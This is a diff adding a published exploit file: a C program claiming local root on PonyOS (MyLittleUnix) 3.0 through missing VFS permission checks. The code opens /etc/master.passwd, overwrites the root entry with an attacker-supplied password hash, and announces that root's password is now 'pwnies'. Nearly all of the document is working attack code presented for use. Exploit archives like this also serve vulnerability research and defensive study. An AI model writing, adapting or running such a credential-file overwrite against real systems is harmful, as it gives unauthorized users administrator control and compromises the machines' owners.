@@ -1,0 +1,65 @@
+# Exploit Title: PonyOS <= 3.0 VFS permissions exploit
+# Google Dork: [if applicable]
+# Date: 29th May 2015
+# Exploit Author: Hacker Fantastic
+# Vendor Homepage: www.ponyos.org
+# Software Link: [download link if available]
+# Version: 3.0
+# Tested on: 3.0
+# CVE : N/A
+
+# Source: https://github.com/HackerFantastic/Public/blob/master/exploits/rarity.c
+
+/* MyLittleUnix <= 3.0 VFS permissions root exploit 
+   ================================================
+   File permissions are not checked, we can abuse 
+   this to replace the root user password with our
+   own and escalate our privileges. This exploit 
+   now 20% cooler and tested on latest 3.0 mlp OS.
+
+   -- prdelka
+*/
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+
+char* pwnystr = "root:07821d2459368443042007bf1c7cdf3c55284"
+		"29a65f8f10ce388d301b47865a283147bfd290545b"
+		"0b9b12ae622a8eb359497cb3635506f99d2f5e4c4e"
+		"594cadd:0:0:HackerFantastic:/home/root:/bi"
+		"n/sh:fancy\n";
+
+int main(){
+	int fd, r;
+	struct stat *fileinfo = malloc(sizeof(struct stat));
+	char *buffer, *line, *filenm = "/etc/master.passwd";
+	printf("[+] MyLittleUnix <=3.0 VFS permissions local root exploit\n");
+	fd = open(filenm,O_RDWR);
+	r = stat(filenm,fileinfo);
+	buffer = malloc((uint)fileinfo->st_size);
+	if(buffer){
+		read(fd,buffer,fileinfo->st_size);
+	}
+	else{
+		printf("[!] No pwn for you pwnie\n");
+		exit(0);
+	}
+	lseek(fd,0,SEEK_SET);
+	line = strtok(buffer,"\n");
+	while(line){
+		if(strstr(line,"root:")){
+			write(fd,pwnystr,strlen(pwnystr));
+		}
+		else{
+			write(fd,line,strlen(line));
+			write(fd,"\n",strlen("\n"));
+		}
+		line = strtok(NULL,"\n");
+	}
+	close(fd);
+	printf("[-] 20percent COOLER! user 'root' password is 'pwnies'\n");
+	exit(0);
+}
